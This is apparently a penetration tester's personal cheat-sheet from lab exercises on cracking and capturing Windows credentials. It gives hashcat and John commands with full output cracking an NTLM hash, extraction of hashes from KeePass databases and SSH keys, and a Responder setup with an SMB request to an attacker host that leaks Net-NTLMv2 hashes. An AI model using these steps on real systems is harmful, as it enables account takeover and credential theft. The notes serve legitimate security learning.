# Password cracking

I sometimes forget what to look for in the outputs of cracking tools, or what the exact params should be.
So this is mostly here as a reminder, as it is far from rocket science.

For NTLM hash cracks you will have something like this:
 
```
Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:${NTLM_HASH}:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:${NTLM_HASH}:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:${NTLM_HASH}:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:${NTLM_HASH}:::
```

So we can crack it with either Hashcat or John:

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt


hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-13th Gen Intel(R) Core(TM) i5-13600K, 3507/7079 MB (1024 MB allocatable), 14MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

077cccc23f8ab7031726a3b70c694a49:Passw0rd123              <------------ Output here
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 077cccc23f8ab7031726a3b70c694a49
Time.Started.....: Sat Mar  4 13:59:18 2023 (3 secs)
Time.Estimated...: Sat Mar  4 13:59:21 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   774.1 kH/s (0.77ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2107392/14344385 (14.69%)
Rejected.........: 0/2107392 (0.00%)
Restore.Point....: 2100224/14344385 (14.64%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: RICAFORT -> Nike13
Hardware.Mon.#1..: Util: 19%

```

or 

```
sudo john -format=nt  hash.txt -w=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=14
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd123      (thm.red\bk-admin)    <------------ Output here
1g 0:00:00:00 DONE (2023-03-04 14:00) 10.00g/s 21033Kp/s 21033Kc/s 21033KC/s Password31..Paris13
Use the "--show --format=NT" options to display all of the cracked passwords reliably
```

## Extracting hashes from interesting files 

We can extract hash for the master password from a .kdbx file with:

```
keepass2john Database.kdbx > result.hash
```

The resulting hash has a prefix `Database:` that should be removed.
Afterwards, we can attempt to crack it with `hashcat -m 13400`

similarly, if we gain access to an ssh private-key, we have
```
ssh2john id_rsa
```
Which, again, will prefix with the filename `id_rsa:` which should be removed before giving it to hashcat.


## Get Net-NTLMv2 hash from a shell

pre-req for this is that the running is allowed to RDP so we can access the user once the NTLMv2 hash is cracked.
check this by doing `net user $username` in the shell.
If the user is in Remote Desktop Users, we are good.

On kali, set up responder on the network interface (usually `tun0`):

```
sudo responder -I tun0 -A
```

Now, from the Windows shell, do something like `dir \\${ATTACKER_IP}\thiswillgetdenied`.

Note that if you can get a windows server to access such an SMB path remotely, this trick can also be abused via e.g. fileuploads


## Crunch

We can use the tool `crunch` to quickly generate simple wordlists.
This can eg be done by doing:

```
crunch 10 10 -t test%%%%%% > testworldlist.txt
```
Which will print `test000001` through `test999999`.

## Online Resource

If everything else fails for a hash, it can be worth it trying to see if [this site](https://hashes.com/en/decrypt/hash) can crack the hash.

